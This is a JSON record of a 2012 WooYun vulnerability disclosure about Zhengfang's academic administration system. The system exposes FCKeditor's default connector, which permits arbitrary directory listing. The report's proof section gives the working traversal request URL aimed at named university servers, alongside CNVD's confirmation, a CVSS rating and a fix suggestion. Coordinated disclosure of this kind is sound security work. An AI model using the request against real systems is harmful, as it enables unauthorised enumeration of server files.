{"id": 18708, "wybug_id": "wooyun-2012-08356", "wybug_title": "正方软件教务系统fckeditor任意文件便利问题", "wybug_corp": "正方软件", "wybug_author": "孤行灯", "wybug_date": "2012-06-16 12:21", "wybug_open_date": "2012-07-31 12:21", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-31：\t细节向公众公开  简要描述： 方正教务系统使用了fckeditor编辑器，没有修改其默认上传接口，导致任意文件遍历问题 详细说明：  fckeditor为了方正系统根目录的fckeditor文件夹中，调用默认的connectors接口即可遍历文件，即访问/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=d:/可以获取d盘文件信息   漏洞证明：  以上海理工大学为例地址：http://jwc1.usst.edu.cn/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=d:/截图：\n\n成都理工大学地址：http://110.189.108.7/(22x10355pp4ki0iphyprakbd)/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=d:/截图：\n\n受影响的还包括西南财经大学等   修复方案：  修改connector.aspx的认证和文件路径限制   版权声明：转载请注明来源 孤行灯@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2012-06-19 14:43 厂商回复： CNVD确认漏洞并复现所述情况，与4月份其他白帽子提交的目录遍历、文件上传漏洞，该漏洞确认为新漏洞。由CNVD直接协调生产厂商处置，根据上两回处置情况，生产厂商处置态度较为积极，不过由于采用的用户较多，各用户网站修复存在进度不一的情况。对漏洞评分如下：CVSS：(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:N) score:4.96（最高10分，中危）即：远程攻击、攻击难度低、不需要用户认证，对机密性造成部分影响，不影响可用性和完整性。技术难度系数：1.0（一般）影响危害系数：1.3（较严重，涉及多所高等院校）CNVD综合评分：4.96*1.0*1.3=6.448对漏洞评分如下： 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-16 13:12 |    \t\ther0ma \t\t\t( 核心白帽子 |\t\t\t        Rank:598 漏洞数:84        | 专注小厂商三十年！)\t\t \n  额 这个漏洞好久好久了吧？难道是另外的？    \n     2012-06-16 13:15 |    \t\t孤行灯 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | ...)\t\t \n  @her0ma 不是吧，只是还有好多学校还有...话说我好像图传错了...    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}